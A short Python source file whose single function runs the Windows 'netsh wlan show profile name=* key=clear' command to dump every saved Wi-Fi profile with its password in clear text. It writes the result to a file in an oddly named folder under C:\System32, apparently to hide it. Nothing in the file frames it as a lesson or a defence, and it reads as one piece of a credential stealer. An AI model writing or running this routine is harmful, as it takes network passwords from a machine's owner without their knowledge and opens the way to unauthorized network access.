import subprocess


def get_pass_wifi():
    """
    writes to a file pass_wifi.txt the result of the
    netsh wlan show profile name=* key=clear command.
    Where is the password from the connected Wi-Fi networks stored
    """
    command = "netsh wlan show profile name=* key=clear"  # command to be executed
    res_cmd = subprocess.check_output(command)  # system command
    # writing the result to a file
    with open(r"C:\System32\x25x02x42\pass_wifi.txt", 'w', encoding='utf-8') as f:
        f.write(str(res_cmd.decode("CP866")))
